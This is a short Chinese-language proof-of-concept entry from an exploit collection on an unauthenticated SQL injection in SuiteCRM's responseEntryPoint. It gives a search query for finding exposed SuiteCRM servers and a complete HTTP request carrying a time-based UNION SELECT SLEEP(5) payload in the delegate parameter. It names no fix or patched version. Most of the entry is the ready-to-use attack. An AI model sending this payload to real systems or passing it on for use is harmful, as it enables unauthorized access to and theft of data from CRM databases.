---
source: "wy876 漏洞文库"
---

# SuiteCRM responseEntryPoint存在SQL注入漏洞

# 一、漏洞简介
SuiteCRM存在SQL注入漏洞，未经身份验证的远程攻击者可以通过该漏洞拼接执行SQL注入语句，从而获取数据库敏感信息。

# 二、影响版本
+ SuiteCRM

# 三、资产测绘
```plain
title="SuiteCRM"
```


# 四、漏洞复现
```plain
GET /index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/scs5n834l406n097>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
